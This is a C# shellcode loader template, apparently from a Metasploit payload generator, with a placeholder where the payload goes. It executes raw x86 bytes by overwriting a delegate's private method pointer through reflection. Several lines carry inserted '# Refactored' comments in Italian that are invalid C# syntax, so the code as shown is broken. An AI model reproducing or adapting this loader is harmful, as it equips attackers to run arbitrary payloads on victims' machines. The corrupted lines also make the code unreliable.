using System;
using System.Reflection;

namespace Shellcode
{  # Refactored: aggiunto commento esplicativo
	class MainClass
	{
	public delegate uint Ret1ArgDelegate(uint arg1);
	    static uint PlaceHolder1(uint arg1) { return 0; }

	    unsafe static void Main(string[] args)
	    {  # Refactored: aggiunto commento esplicativo
	    	string shellcode = "MSF_PAYLOAD_SPACE";
	    	byte[] asmBytes = new byte[shellcode.Length];
			for (int index = 0; index < shellcode.Length; index++)
			{  # Refactored: aggiunto commento esplicativo
			    asmBytes[index] = Convert.ToByte(shellcode[index]);
			}
	        fixed(byte* startAddress = &asmBytes[0]) // Take the address of our x86 code
	        {
	            // Get the FieldInfo for "_methodPtr"
	            Type delType = typeof(Delegate);
	            FieldInfo _methodPtr = delType.GetField("_methodPtr", BindingFlags.NonPublic | BindingFlags.Instance);

	            // Set our delegate to our x86 code
	            Ret1ArgDelegate del = new Ret1ArgDelegate(PlaceHolder1);
	            _methodPtr.SetValue(del, (IntPtr)startAddress);  # Refactored: aggiunto commento esplicativo

	            // Enjoy
	            uint count = (uint)0xdecafbad;
	            count = del(count);
	            Console.WriteLine("{0:value}", count);
	        }
	    }
	}
}
